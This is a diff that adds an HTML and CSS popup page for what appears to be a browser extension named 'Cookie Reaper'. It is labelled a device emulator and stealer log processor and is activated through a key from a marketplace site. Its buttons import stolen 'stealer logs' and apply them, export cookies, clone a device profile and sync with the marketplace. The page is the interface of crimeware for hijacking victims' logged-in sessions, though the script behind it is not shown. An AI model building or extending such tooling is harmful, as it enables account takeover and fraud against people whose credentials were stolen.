@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Reaper - Device Emulator</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            width: 400px;
+            min-height: 500px;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+            color: #ffffff;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
+            padding: 15px;
+            text-align: center;
+            border-bottom: 2px solid #990000;
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 18px;
+            font-weight: bold;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+        }
+        
+        .header .subtitle {
+            font-size: 12px;
+            opacity: 0.9;
+            margin-top: 5px;
+        }
+        
+        .activation-section {
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #444;
+        }
+        
+        .activation-input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #666;
+            border-radius: 5px;
+            background: #333;
+            color: #fff;
+            font-size: 14px;
+        }
+        
+        .activate-btn {
+            background: linear-gradient(135deg, #00cc00 0%, #009900 100%);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+        }
+        
+        .activate-btn:hover {
+            background: linear-gradient(135deg, #00dd00 0%, #00aa00 100%);
+        }
+        
+        .marketplace-link {
+            color: #ff6666;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .main-content {
+            padding: 20px;
+            display: none;
+        }
+        
+        .user-info {
+            background: #333;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #00cc00;
+        }
+        
+        .feature-section {
+            margin-bottom: 20px;
+        }
+        
+        .feature-title {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #ff6666;
+        }
+        
+        .feature-btn {
+            background: linear-gradient(135deg, #444 0%, #666 100%);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+            font-size: 12px;
+        }
+        
+        .feature-btn:hover {
+            background: linear-gradient(135deg, #555 0%, #777 100%);
+        }
+        
+        .status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-size: 12px;
+        }
+        
+        .status.success {
+            background: #1a4d1a;
+            border: 1px solid #00cc00;
+        }
+        
+        .status.error {
+            background: #4d1a1a;
+            border: 1px solid #cc0000;
+        }
+        
+        .file-input {
+            display: none;
+        }
+        
+        .file-label {
+            background: linear-gradient(135deg, #0066cc 0%, #004499 100%);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            display: inline-block;
+            margin: 5px;
+            font-size: 12px;
+        }
+        
+        .file-label:hover {
+            background: linear-gradient(135deg, #0077dd 0%, #0055aa 100%);
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🍪 Cookie Reaper</h1>
+        <div class="subtitle">Device Emulator & Stealer Log Processor</div>
+    </div>
+    
+    <div id="activation-section" class="activation-section">
+        <h3>🔑 Activation Required</h3>
+        <p>Enter your activation key from reaper-market.com</p>
+        <input type="text" id="activation-key" class="activation-input" placeholder="Enter activation key...">
+        <button id="activate-btn" class="activate-btn">Activate</button>
+        <br>
+        <a href="https://reaper-market.com" target="_blank" class="marketplace-link">Get activation key →</a>
+        <div id="activation-status"></div>
+    </div>
+    
+    <div id="main-content" class="main-content">
+        <div id="user-info" class="user-info">
+            <strong>Welcome back, <span id="username">User</span>!</strong>
+            <div style="font-size: 12px; margin-top: 5px; opacity: 0.8;">
+                Extension activated successfully
+            </div>
+        </div>
+        
+        <div class="feature-section">
+            <div class="feature-title">🎯 Cookie Management</div>
+            <button id="view-cookies-btn" class="feature-btn">View Cookies</button>
+            <button id="export-cookies-btn" class="feature-btn">Export Cookies</button>
+            <button id="clear-cookies-btn" class="feature-btn">Clear All</button>
+        </div>
+        
+        <div class="feature-section">
+            <div class="feature-title">📥 Import Stealer Logs</div>
+            <input type="file" id="stealer-log-file" class="file-input" accept=".json,.txt">
+            <label for="stealer-log-file" class="file-label">Choose Log File</label>
+            <button id="import-logs-btn" class="feature-btn">Import & Apply</button>
+        </div>
+        
+        <div class="feature-section">
+            <div class="feature-title">📤 Device Profile</div>
+            <button id="export-profile-btn" class="feature-btn">Export Current Profile</button>
+            <button id="clone-device-btn" class="feature-btn">Clone Device</button>
+        </div>
+        
+        <div class="feature-section">
+            <div class="feature-title">⚙️ Advanced</div>
+            <button id="sync-marketplace-btn" class="feature-btn">Sync with Marketplace</button>
+            <button id="settings-btn" class="feature-btn">Settings</button>
+        </div>
+        
+        <div id="status-message"></div>
+    </div>
+    
+    <script src="cookie-reaper-popup.js"></script>
+</body>
+</html>
